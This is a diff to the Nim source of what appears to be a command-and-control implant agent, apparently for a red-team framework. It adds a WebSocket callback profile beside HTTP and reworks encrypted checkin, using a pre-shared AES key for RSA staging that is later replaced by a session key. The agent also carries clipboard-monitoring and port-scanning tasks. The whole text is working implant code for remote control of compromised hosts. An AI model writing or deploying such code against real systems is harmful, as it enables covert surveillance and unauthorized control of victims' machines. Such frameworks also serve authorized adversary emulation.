@@ -2,6 +2,7 @@ import std/[json, random, os, base64, tables, times, strutils, strformat]
 import config
 import global_data
 import profiles/http_profile
+import profiles/websocket_profile
 import utils/sysinfo
 import tasks/exit
 import tasks/sleep
@@ -77,9 +78,19 @@ type
   MonitoringTaskType* = enum
     mtClipboardMonitor, mtPortscan
   
+  ProfileKind = enum
+    pkHttp, pkWebSocket
+  
+  Profile = object
+    case kind: ProfileKind
+    of pkHttp:
+      httpProfile: HttpProfile
+    of pkWebSocket:
+      wsProfile: WebSocketProfile
+  
   Agent* = ref object
     config: Config
-    profile: HttpProfile
+    profile: Profile
     callbackUuid: string
     shouldExit*: bool
     sleepInterval: int
@@ -88,6 +99,35 @@ type
     backgroundTasks: Table[string, BackgroundTaskState]  # taskId -> state
     activeMonitoringTasks: Table[string, MonitoringTaskType]  # Task ID -> task type
 
+# Profile helper procs
+proc send(profile: var Profile, data: string, callbackUuid: string = ""): string =
+  case profile.kind
+  of pkHttp:
+    result = profile.httpProfile.send(data, callbackUuid)
+  of pkWebSocket:
+    result = profile.wsProfile.send(data, callbackUuid)
+
+proc setAesKey(profile: var Profile, key: seq[byte]) =
+  case profile.kind
+  of pkHttp:
+    profile.httpProfile.setAesKey(key)
+  of pkWebSocket:
+    profile.wsProfile.setAesKey(key)
+
+proc hasAesKey(profile: Profile): bool =
+  case profile.kind
+  of pkHttp:
+    result = profile.httpProfile.hasAesKey()
+  of pkWebSocket:
+    result = profile.wsProfile.hasAesKey()
+
+proc performKeyExchange(profile: var Profile): tuple[success: bool, newUuid: string] =
+  case profile.kind
+  of pkHttp:
+    result = profile.httpProfile.performKeyExchange()
+  of pkWebSocket:
+    result = profile.wsProfile.performKeyExchange()
+
 proc newAgent*(): Agent =
   ## Create a new agent instance
   result = Agent()
@@ -95,7 +135,14 @@ proc newAgent*(): Agent =
   result.config = getConfig()
   # Initialize global data storage
   initGlobalData()
-  result.profile = newHttpProfile()
+  
+  # Initialize the correct profile based on config
+  case result.config.profile
+  of "websocket":
+    result.profile = Profile(kind: pkWebSocket, wsProfile: newWebSocketProfile())
+  else:  # Default to HTTP for "http" or any other value
+    result.profile = Profile(kind: pkHttp, httpProfile: newHttpProfile())
+  
   result.callbackUuid = result.config.uuid  # Initialize with payload UUID
   result.shouldExit = false
   result.sleepInterval = result.config.callbackInterval
@@ -103,7 +150,9 @@ proc newAgent*(): Agent =
   result.taskResponses = @[]
   result.backgroundTasks = initTable[string, BackgroundTaskState]()
   
-  # If AESPSK is configured, parse and set it immediately (before checkin)
+  # If AESPSK is configured, parse and set it
+  # Note: For RSA mode, AESPSK is used temporarily for staging_rsa, then replaced by session key
+  # For AESPSK-only mode (encryptedExchange=false), AESPSK is used for all communications
   if result.config.aesKey.len > 0:
     try:
       # AESPSK is a JSON string like: {"dec_key": "...", "enc_key": "...", "value": "aes256_hmac"}
@@ -113,7 +162,10 @@ proc newAgent*(): Agent =
       let keyBytes = cast[seq[byte]](decoded)
       result.profile.setAesKey(keyBytes)
       if result.config.debug:
-        echo "[DEBUG] AESPSK detected - using pre-shared AES key (no RSA exchange)"
+        if result.config.encryptedExchange:
+          echo "[DEBUG] AESPSK loaded for RSA staging (will be replaced by session key after key exchange)"
+        else:
+          echo "[DEBUG] AESPSK detected - using pre-shared AES key (no RSA exchange)"
     except:
       if result.config.debug:
         echo "[DEBUG] Failed to parse AESPSK: ", getCurrentExceptionMsg()
@@ -144,12 +196,21 @@ proc checkin*(agent: Agent): bool =
   if agent.config.debug:
     echo "[DEBUG] Starting checkin..."
   
-  # Perform key exchange if enabled AND no AES key is set yet (no AESPSK)
-  if agent.config.encryptedExchange and not agent.profile.hasAesKey():
-    if not agent.profile.performKeyExchange():
+  # Perform RSA key exchange if enabled (regardless of whether AESPSK is set)
+  # AESPSK is used to encrypt the staging_rsa message, then replaced with session key
+  if agent.config.encryptedExchange:
+    if agent.config.debug:
+      echo "[DEBUG] RSA key exchange enabled - performing key exchange..."
+    let (success, newUuid) = agent.profile.performKeyExchange()
+    if not success:
       if agent.config.debug:
         echo "[DEBUG] Key exchange failed"
       return false
+    # Update callback UUID if server provided one
+    if newUuid.len > 0:
+      if agent.config.debug:
+        echo "[DEBUG] Updating callback UUID from ", agent.callbackUuid, " to ", newUuid
+      agent.callbackUuid = newUuid
   
   # Build and send checkin
   let checkinMsg = buildCheckinMessage()
